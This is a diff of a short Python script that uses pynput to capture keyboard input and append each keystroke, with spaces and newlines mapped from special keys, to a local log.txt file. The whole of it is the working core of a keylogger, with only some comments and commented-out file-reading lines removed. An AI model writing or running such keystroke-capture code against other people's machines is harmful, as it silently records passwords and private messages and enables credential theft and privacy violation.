@@ -1,15 +1,9 @@
 #r= reading, w=write a=apending
-# f=open('log.txt','r')
-# #f.write("i'm litterally a genius")
-# filedata=f.read()
-# print(filedata)
-# f.close()
+#import
 from pynput.keyboard import Listener,Key
-#listen 
 def writetofile(key):
     try:
         keydata=key.char
-    #    keydata=keydata.replace("'","")
     except AttributeError:
         if key==Key.space:
             keydata= " "
@@ -26,8 +20,7 @@ def writetofile(key):
             keydata= ""
         if key==Key.enter:
             keydata= "\n"
-    #    if key==Key.ctrl_l\x03:
-    #        keydata= ""
+   
     with open('log.txt', 'a',encoding='utf-8') as f:
         f.write(keydata)
 
